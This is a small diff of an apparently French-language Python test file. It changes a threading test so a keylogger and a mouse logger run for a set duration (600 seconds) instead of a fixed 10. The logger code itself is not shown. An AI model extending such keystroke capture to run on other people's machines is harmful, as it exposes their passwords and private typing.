@@ -10,10 +10,10 @@ def main():
     # test_mouselog(5)
     # test_getImage()
     # test_getSound(2)
-    test_threading()
+    test_threading(600)
 
 
-def test_threading():
+def test_threading(duration):
     klog = keylog.KeyLogger()
     mlog = Mouselogger.Mouselog()
     print("objets intanciés")
@@ -21,7 +21,7 @@ def test_threading():
     print("keylog lancé")
     mlog.start()
     print("mouselog lancé")
-    time.sleep(10)
+    time.sleep(duration)
     klog.stop()
     print("keylog arrêté")
     mlog.stop()
